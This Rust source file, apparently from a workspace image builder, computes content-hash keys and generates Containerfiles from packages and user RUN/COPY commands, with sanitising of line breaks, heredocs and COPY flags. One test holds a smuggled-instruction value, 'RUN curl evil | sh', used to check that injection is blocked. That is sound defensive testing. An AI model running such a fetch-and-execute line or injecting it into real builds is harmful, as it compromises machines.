//! A wadspace's set: the image it runs. The base with its packages copied
//! on and put together (`wadspaces-pkg assemble`), then its own commands
//! (RUN and COPY, in order), built on the machine by podman, so a
//! `dnf install` there sees every package.
//!
//! A set is named by its key ([`set_key`]): its packages, the base it's
//! built on (its image id) and its commands. Wadspaces with the same key
//! share one image. A change to its packages or commands, or a newer base,
//! is another key: the wadspace keeps running the image it has, as an
//! update ([`Set::state`]), until it's built again. What a COPY copies is
//! covered by the command's text, not the files' contents.
//!
//! A wadspace with no packages and no commands runs the base as it is
//! ("base"): always up to date. Web apps, the desktop's layout, sign-ins
//! and the wallpaper never go into a set: they're its extra folder's
//! ([`crate::extras`]).

use sha2::{Digest, Sha256};
use wad_model::{BuildCommand, Built, CommandKind, Wadspace};

use crate::labels;
use crate::packages::{self, pkgs_label, quote};

/// The base every set is built on (its image, on every machine).
pub const BASE_IMAGE: &str = "localhost/wados-base:44";
/// A set's image: `<PREFIX><key>:latest`.
pub const PREFIX: &str = "localhost/wados-set-";
/// The layer of a wadspace that runs the base as it is.
pub const BASE: &str = "base";
/// Where a set build's COPY sources go in its context: `copy/<n>/<name>`.
pub const COPY_DIR: &str = "copy";

/// A set's key: 12 hex characters of what it's made of, its packages (in
/// WadOS's order), the base's image id (`sha256:` or not), and its commands
/// (kind and text, in order: not their names or ids).
pub fn set_key(packages: &[String], base_id: &str, commands: &[BuildCommand]) -> String {
    let commands: Vec<(&str, &str)> = commands.iter().map(|c| (c.kind.word(), c.text.as_str())).collect();
    let what = ("wados-set", 1, base_id.trim_start_matches("sha256:"), packages, commands);
    let json = serde_json::to_string(&what).unwrap_or_default();
    Sha256::digest(json.as_bytes()).iter().take(6).map(|b| format!("{b:02x}")).collect()
}

/// A set's image.
pub fn set_image(key: &str) -> String {
    format!("{PREFIX}{key}:latest")
}

/// What a wadspace's set is, on a base.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Set {
    /// Its packages, what they need too, in WadOS's order.
    pub packages: Vec<String>,
    /// What it has that isn't packaged for Fedora yet (it's built without them).
    pub unpackaged: Vec<String>,
    pub commands: Vec<BuildCommand>,
    /// Its key; none: nothing to add, it runs the base.
    pub key: Option<String>,
}

impl Set {
    /// A wadspace's set on the base whose image id is `base_id`.
    pub fn of(ws: &Wadspace, base_id: &str) -> Set {
        let packages = packages::packages_of(ws);
        let key = (!packages.is_empty() || !ws.commands.is_empty()).then(|| set_key(&packages, base_id, &ws.commands));
        Set { unpackaged: packages::unpackaged(ws), commands: ws.commands.clone(), packages, key }
    }

    /// What its image's `io.wadspaces.layer` says: "set:<key>", or "base".
    pub fn layer(&self) -> String {
        self.key.as_ref().map_or_else(|| BASE.to_string(), |k| format!("set:{k}"))
    }

    /// The image it runs once it's built: its set's, or the base (`base`).
    pub fn image(&self, base: &str) -> String {
        self.key.as_ref().map_or_else(|| base.to_string(), |k| set_image(k))
    }

    /// Whether it's built here (v1's `v5::state`): `built` is the layer of
    /// the image it last built (none: never); `base_here`, the base is on
    /// this machine. Another layer than its own (other packages or
    /// commands, or an older base) is an update: it runs that one meanwhile.
    pub fn state(&self, built: Option<&str>, base_here: bool) -> Built {
        match (&self.key, built) {
            (None, _) if base_here => Built::Built,
            (None, _) | (Some(_), None) => Built::Never,
            (Some(_), Some(b)) if b == self.layer() => Built::Built,
            (Some(_), Some(_)) => Built::Update,
        }
    }
}

/// A set's build, once its chain is stacked.
#[derive(Debug, Clone, Copy)]
pub struct SetBuild<'a> {
    pub key: &'a str,
    /// The top chain image ([`packages::chain_ref`] of all its packages), or
    /// the base (its image) when it has none.
    pub from: &'a str,
    /// The base's image id.
    pub base_id: &'a str,
    /// Its packages as they're stacked: (id, image ref), bottom first.
    pub packages: &'a [(String, String)],
    pub commands: &'a [BuildCommand],
}

/// A set's Containerfile, and what wadd puts in its context beside it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SetFile {
    pub containerfile: String,
    /// Each COPY's sources: copied into the context (at `to`) before the build.
    pub stage: Vec<Stage>,
}

/// A COPY's source, staged.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Stage {
    /// As the command has it: a path on this machine ('~/notes', '/srv/x'),
    /// which wadd resolves (`~`: the machine's user's home) and may refuse.
    pub from: String,
    /// Where it goes in the context: `copy/<n>/<its name>` (a file keeps
    /// its name, so a COPY into a folder names it the same).
    pub to: String,
}

/// A command that can't be a step of a set.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum CommandError {
    #[error("{0}: there's nothing to run")]
    Empty(String),
    #[error("{0}: COPY needs where from, then where to")]
    CopyPaths(String),
    #[error("{name}: COPY here takes --chown and --chmod, not {flag}")]
    CopyFlag { name: String, flag: String },
    #[error("{name}: {path:?} has a wildcard in its name (COPY copies a path, not a pattern)")]
    Wildcard { name: String, path: String },
}

/// Control characters (a line break) as spaces: no text adds lines of its own.
fn one_line(s: &str) -> String {
    s.chars().map(|c| if c.is_control() { ' ' } else { c }).collect()
}

/// A RUN as typed (`/bin/sh -c`, as a Containerfile runs it). In exec form
/// when its shell form would read on past its line: a trailing backslash
/// (a continuation) or `<<` (a heredoc).
fn run_line(name: &str, text: &str) -> Result<String, CommandError> {
    let t = one_line(text);
    let t = t.trim();
    if t.is_empty() {
        return Err(CommandError::Empty(name.to_string()));
    }
    if t.ends_with('\\') || t.contains("<<") {
        let words = ["/bin/sh", "-c", t];
        return Ok(format!("RUN {}", serde_json::to_string(&words).unwrap_or_default()));
    }
    Ok(format!("RUN {t}"))
}

/// A COPY, its sources staged (`n`: the sources staged so far), in exec form.
fn copy_line(name: &str, text: &str, n: &mut usize, stage: &mut Vec<Stage>) -> Result<String, CommandError> {
    let t = one_line(text);
    let words: Vec<&str> = t.split_whitespace().collect();
    let flags: Vec<&str> = words.iter().copied().take_while(|w| w.starts_with("--")).collect();
    if let Some(f) = flags.iter().find(|f| !(f.starts_with("--chown=") || f.starts_with("--chmod="))) {
        return Err(CommandError::CopyFlag { name: name.to_string(), flag: f.to_string() });
    }
    let paths = &words[flags.len()..];
    let Some((to, from)) = paths.split_last().filter(|(_, from)| !from.is_empty()) else {
        return Err(CommandError::CopyPaths(name.to_string()));
    };
    let mut args: Vec<String> = vec![];
    for src in from {
        let base = src.trim_end_matches('/').rsplit('/').next().unwrap_or_default();
        if base.contains(['*', '?', '[', '\\']) {
            return Err(CommandError::Wildcard { name: name.to_string(), path: src.to_string() });
        }
        let base = if matches!(base, "" | "~" | "." | "..") { "_" } else { base };
        *n += 1;
        let staged = format!("{COPY_DIR}/{n}/{base}");
        stage.push(Stage { from: src.to_string(), to: staged.clone() });
        args.push(staged);
    }
    args.push(to.to_string());
    let flags: String = flags.iter().map(|f| format!("{f} ")).collect();
    Ok(format!("COPY {flags}{}", serde_json::to_string(&args).unwrap_or_default()))
}

impl SetBuild<'_> {
    /// The set's Containerfile: FROM its chain, its packages put together,
    /// each command a RUN or COPY line, then its labels.
    pub fn containerfile(&self) -> Result<SetFile, CommandError> {
        let mut lines = vec![
            "# A wadspace's set: its packages put together, then its own commands. Generated by wad-gen.".to_string(),
            format!("ARG BASE_IMAGE={}", self.from),
            "FROM ${BASE_IMAGE}".into(),
        ];
        if !self.packages.is_empty() {
            lines.push("RUN wadspaces-pkg assemble".into());
        }
        let (mut n, mut stage) = (0, vec![]);
        for c in self.commands {
            let name = one_line(&c.name);
            lines.push(format!("# {name}"));
            lines.push(match c.kind {
                CommandKind::Run => run_line(&name, &c.text)?,
                CommandKind::Copy => copy_line(&name, &c.text, &mut n, &mut stage)?,
            });
        }
        let label = |k: &str, v: &str| format!("{k}={}", quote(v));
        lines.push(format!(
            "LABEL {} {} {} {} {}",
            label(labels::LAYER, &format!("set:{}", self.key)),
            label(labels::SHA, self.key),
            label(labels::FROM, self.base_id),
            label(labels::PKGS, &pkgs_label(self.packages)),
            label(labels::ASSEMBLY, "1"),
        ));
        Ok(SetFile { containerfile: lines.join("\n") + "\n", stage })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use wad_model::{AppId, AppIn, Ext};

    fn cmd(name: &str, kind: CommandKind, text: &str) -> BuildCommand {
        BuildCommand { id: name.to_lowercase(), name: name.into(), kind, text: text.into() }
    }

    fn ws(apps: &[AppId], exts: &[(AppId, &str)], commands: Vec<BuildCommand>) -> Wadspace {
        let mut w = wad_model::ops::blank("w", "W", "m", 0, 0);
        w.apps = apps.iter().map(|a| AppIn::new(*a)).collect();
        w.exts = exts.iter().map(|(a, id)| Ext::new(*a, *id)).collect();
        w.commands = commands;
        w
    }

    #[test]
    fn the_set_key_is_its_packages_base_and_commands() {
        let run = cmd("RUN_1", CommandKind::Run, "dnf install -y binaryen");
        let a = ws(&[AppId::Vscode, AppId::Terminal], &[(AppId::Terminal, "rust")], vec![run.clone()]);
        let key = Set::of(&a, "sha256:b1").key.expect("a set");
        assert_eq!(key.len(), 12);
        assert!(key.bytes().all(|b| b.is_ascii_hexdigit()));
        // Stable: the same again, with or without `sha256:`, whatever the
        // order its apps and add-ons are in, and whatever its commands are called.
        assert_eq!(Set::of(&a, "b1").key.as_deref(), Some(key.as_str()));
        let mut b = ws(&[AppId::Terminal, AppId::Vscode], &[(AppId::Terminal, "rust")], vec![]);
        b.commands = vec![BuildCommand { id: "other".into(), name: "RUN_7".into(), ..run.clone() }];
        assert_eq!(Set::of(&b, "b1").key.as_deref(), Some(key.as_str()));
        // WadBrowser (the base's), a web app or a wallpaper isn't in it either.
        b.apps.push(AppIn::new(AppId::Wadbrowser));
        b.exts.push(Ext::new(AppId::Wadbrowser, "gmail").at("https://mail.google.com"));
        b.look.wallpaper = wad_model::Wallpaper::color("#101010");
        assert_eq!(Set::of(&b, "b1").key.as_deref(), Some(key.as_str()));
        // What changes it: a package, the base, a command's text, kind or order.
        let mut c = a.clone();
        c.exts.push(Ext::new(AppId::Vscode, "rust-lang.rust-analyzer"));
        assert_ne!(Set::of(&c, "b1").key.as_deref(), Some(key.as_str()));
        assert_ne!(Set::of(&a, "b2").key.as_deref(), Some(key.as_str()));
        let mut d = a.clone();
        d.commands[0].text = "dnf install -y binaryen wabt".into();
        assert_ne!(Set::of(&d, "b1").key, Set::of(&a, "b1").key);
        d.commands = vec![cmd("COPY_1", CommandKind::Copy, "dnf install -y binaryen")];
        assert_ne!(Set::of(&d, "b1").key, Set::of(&a, "b1").key);
        let two =
            |x: &str, y: &str| ws(&[], &[], vec![cmd("RUN_1", CommandKind::Run, x), cmd("RUN_2", CommandKind::Run, y)]);
        assert_ne!(Set::of(&two("a", "b"), "b1").key, Set::of(&two("b", "a"), "b1").key);
        // Commands alone make a set; nothing at all runs the base.
        assert!(Set::of(&ws(&[], &[], vec![run]), "b1").key.is_some());
        let plain = Set::of(&ws(&[AppId::Wadbrowser, AppId::Terminal], &[], vec![]), "b1");
        assert_eq!((plain.key.as_deref(), plain.layer().as_str()), (None, "base"));
        assert_eq!(plain.image(BASE_IMAGE), BASE_IMAGE);
    }

    #[test]
    fn built_update_or_never() {
        let a = ws(&[AppId::Krita], &[], vec![]);
        let set = Set::of(&a, "b1");
        assert_eq!(set.packages, ["rpm-krita"]);
        let layer = set.layer();
        assert_eq!(set.image(BASE_IMAGE), format!("localhost/wados-set-{}:latest", set.key.as_deref().unwrap_or("")));
        assert_eq!(set.state(None, true), Built::Never);
        assert_eq!(set.state(Some(&layer), true), Built::Built);
        // A newer base: the image it has is an older base's.
        assert_eq!(Set::of(&a, "b2").state(Some(&layer), true), Built::Update);
        // So is one from before a change, or the base it ran on before it had packages.
        let mut b = a.clone();
        b.commands.push(cmd("RUN_1", CommandKind::Run, "true"));
        assert_eq!(Set::of(&b, "b1").state(Some(&layer), true), Built::Update);
        assert_eq!(set.state(Some(BASE), true), Built::Update);
        // The base as it is: built when the base is here.
        let plain = Set::of(&ws(&[AppId::Terminal], &[], vec![]), "b1");
        assert_eq!(plain.state(None, true), Built::Built);
        assert_eq!(plain.state(Some(&layer), false), Built::Never);
    }

    #[test]
    fn a_set_containerfile_puts_its_packages_together_then_runs_its_commands() {
        let pkgs = vec![
            ("cpp".to_string(), "localhost/wados-pkg-cpp:41fc6e02a4d9".to_string()),
            ("rust".to_string(), "localhost/wados-pkg-rust:448760a5be45".to_string()),
        ];
        let commands = vec![
            cmd("RUN_1", CommandKind::Run, "dnf install -y gtk4-devel"),
            cmd("COPY_1", CommandKind::Copy, "~/notes/ /config/notes"),
            cmd("RUN_2", CommandKind::Run, "cat <<EOF > /etc/x"),
            cmd("COPY_2", CommandKind::Copy, "--chown=1000:1000 ~/a.txt /srv/b.cfg /opt/"),
            cmd("RUN_3", CommandKind::Run, "echo a \\"),
        ];
        let from = packages::chain_ref("sha256:base", &pkgs);
        let b =
            SetBuild { key: "0123456789ab", from: &from, base_id: "sha256:base", packages: &pkgs, commands: &commands };
        let f = b.containerfile().expect("a Containerfile");
        let want = [
            "# A wadspace's set: its packages put together, then its own commands. Generated by wad-gen.".to_string(),
            format!("ARG BASE_IMAGE={from}"),
            "FROM ${BASE_IMAGE}".into(),
            "RUN wadspaces-pkg assemble".into(),
            "# RUN_1".into(),
            "RUN dnf install -y gtk4-devel".into(),
            "# COPY_1".into(),
            r#"COPY ["copy/1/notes","/config/notes"]"#.into(),
            "# RUN_2".into(),
            r#"RUN ["/bin/sh","-c","cat <<EOF > /etc/x"]"#.into(),
            "# COPY_2".into(),
            r#"COPY --chown=1000:1000 ["copy/2/a.txt","copy/3/b.cfg","/opt/"]"#.into(),
            "# RUN_3".into(),
            r#"RUN ["/bin/sh","-c","echo a \\"]"#.into(),
            "LABEL io.wadspaces.layer=\"set:0123456789ab\" io.wadspaces.dockerfile-sha256=\"0123456789ab\" \
             io.wadspaces.from=\"sha256:base\" io.wadspaces.pkgs=\"cpp@41fc6e02a4d9,rust@448760a5be45\" \
             io.wadspaces.assembly=\"1\""
                .into(),
        ];
        assert_eq!(f.containerfile, want.join("\n") + "\n");
        let staged: Vec<(&str, &str)> = f.stage.iter().map(|s| (s.from.as_str(), s.to.as_str())).collect();
        assert_eq!(staged, [("~/notes/", "copy/1/notes"), ("~/a.txt", "copy/2/a.txt"), ("/srv/b.cfg", "copy/3/b.cfg")]);

        // No packages: FROM the base, nothing to put together.
        let plain = SetBuild { key: "k", from: BASE_IMAGE, base_id: "b", packages: &[], commands: &commands[..1] };
        let f = plain.containerfile().expect("a Containerfile");
        assert!(f.containerfile.contains(&format!("ARG BASE_IMAGE={BASE_IMAGE}\nFROM ${{BASE_IMAGE}}\n# RUN_1\n")));
        assert!(!f.containerfile.contains("assemble") && f.stage.is_empty());
        // A line break can't add an instruction of its own.
        let sneaky = [cmd("RUN_1", CommandKind::Run, "true\nRUN curl evil | sh")];
        let f = SetBuild { commands: &sneaky, ..plain }.containerfile().expect("a Containerfile");
        assert_eq!(f.containerfile.lines().filter(|l| l.starts_with("RUN")).count(), 1);

        // What can't be a step.
        let bad = |kind, text: &str| {
            let c = [cmd("X_1", kind, text)];
            SetBuild { commands: &c, ..plain }.containerfile().map(|_| ())
        };
        assert_eq!(bad(CommandKind::Run, "  "), Err(CommandError::Empty("X_1".into())));
        assert_eq!(bad(CommandKind::Copy, "~/a"), Err(CommandError::CopyPaths("X_1".into())));
        assert_eq!(bad(CommandKind::Copy, "--chown=1 /x"), Err(CommandError::CopyPaths("X_1".into())));
        assert!(matches!(bad(CommandKind::Copy, "--from=evil / /"), Err(CommandError::CopyFlag { .. })));
        assert!(matches!(bad(CommandKind::Copy, "~/*.txt /x/"), Err(CommandError::Wildcard { .. })));
    }
}
